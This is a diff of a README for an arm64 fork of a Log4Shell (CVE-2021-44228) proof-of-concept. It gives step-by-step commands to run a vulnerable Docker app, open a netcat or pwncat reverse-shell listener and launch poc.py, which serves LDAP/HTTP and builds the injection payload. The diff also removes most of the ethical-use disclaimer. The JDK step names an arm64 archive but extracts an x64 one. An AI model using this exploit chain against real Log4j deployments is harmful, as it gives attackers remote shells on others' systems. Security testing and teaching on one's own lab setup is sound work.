@@ -2,27 +2,31 @@
 This is a fork optimized for arm64/v8 systems from [log4j-shell-poc](https://github.com/teimichael/log4j-shell-poc), a Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability.
 
 ## Workflow
-### Java Environment
+### Set Java Environment
 - Download `jdk-8u60-linux-arm64-vfp-hflt.tar.gz` from [Oracle archives](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html)
 - Run
 ```
 tar -xf jdk-8u60-linux-x64.tar.gz
 ```
 
-### Python Environment
+### Set Python Environment
 ```
 pip install -r requirements.txt
 ```
 
-### Run vulnerable app
+### Build Vulnerable App
 ```c
 docker build -t log4j-shell-poc .
-docker run --network host log4j-shell-poc
 ```
 
-### Exploit
+### Run Vulnerable App
+```c
+docker run --network host --name poc log4j-shell-poc
+```
 
-* Start a netcat listener to accept reverse shell connection.<br>
+### Exploit Vulnerable App
+
+* Start a netcat listener to accept reverse shell connection.
 ```py
 nc -lvnp 9001
 ```
@@ -32,7 +36,7 @@ Or start [pwncat](https://github.com/calebstewart/pwncat)
 python3 -m pwncat -lp 9001 -m linux
 ```
 
-* Launch the exploit.<br>
+* Launch the exploit.
 ```py
 $ python3 poc.py --userip localhost --webport 8000 --lport 9001
 
@@ -49,13 +53,6 @@ Listening on 0.0.0.0:1389
 
 This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.
 
-<br>
-
-
-
 Disclaimer
 -
-This repository is not intended to be a one-click exploit to CVE-2021-44228. The purpose of this project is to help people learn about this awesome vulnerability, and perhaps test their own applications (however there are better applications for this purpose, ei: [https://log4shell.tools/](https://log4shell.tools/)).
-
-Our team will not aid, or endorse any use of this exploit for malicious activity, thus if you ask for help you may be required to provide us with proof that you either own the target service or you have permissions to pentest on it.
-
+This repository is not intended to be a one-click exploit to CVE-2021-44228.
